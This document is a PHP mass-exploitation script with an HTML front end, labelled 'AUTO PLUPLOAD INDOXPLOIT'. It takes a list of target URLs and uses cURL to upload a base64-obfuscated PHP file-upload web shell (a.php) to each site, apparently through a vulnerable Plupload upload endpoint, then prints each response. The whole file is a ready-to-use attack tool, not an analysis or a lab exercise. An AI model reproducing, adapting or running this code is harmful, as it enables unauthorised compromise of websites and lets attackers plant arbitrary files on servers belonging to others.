<link href='http://fonts.googleapis.com/css?family=Love+Ya+Like+A+Sister' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Kaushan+Script' rel='stylesheet' type='text/css'>


 <style type="text/css">
body {text-align:center;}
a {color:darkgreen; font-family: 'Kaushan Script', sans-serif; }
.anu { text-size:40px;font-family: 'Love Ya Like A Sister', sans-serif; }
.lol {font-family: 'Kaushan Script', sans-serif; }
.entryfield {width:600px;height:200px;border:1px solid green; font-family: 'Kaushan Script', sans-serif; }
.subbtn {background:green;color:white;border: 1px solid darkgreen; padding:6px 6px 6px 6px; font-family: 'Kaushan Script', sans-serif; }
.subbtn:hover {background:#c0bfbf;color:#000000; font-family: 'Kaushan Script', sans-serif; }
</style>
<body onLoad="type_text()" ; bgColor=#FFFFFFF">
<br>
<br>
<div class="anu"><font size="40">AUTO PLUPLOAD INDOXPLOIT</font></div>
 <form method="post" action="" enctype="multipart/form-data">
<textarea class="entryfield" name="sites"></textarea><br><br>
<input class="subbtn" type="submit" name="go" value="Klik Senpaiii !!">
</form>





<?php

/* ustadcage_48 */
/* cURL Scripter */

$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
if($go) {
foreach($site as $sites) {

	$nama_doang = "a.php";
	$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
	$decode_isi = base64_decode($isi_nama_doang);
	$encode = base64_encode($nama_doang);
	$fp = fopen($nama_doang,"w");
	fputs($fp, $decode_isi);

$url = "{$sites}"; // put URL Here
$post = array
(
"file" => "@{$nama_doang}",
"name" => " a.php"
);
$ch = curl_init ("$url");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
@curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
$data = curl_exec ($ch);
curl_close ($ch);

echo "<div class='lol'><a href=$sites>$sites</a><br>Result<br>";
echo $data;
echo "</div><br>";

}
}

?>
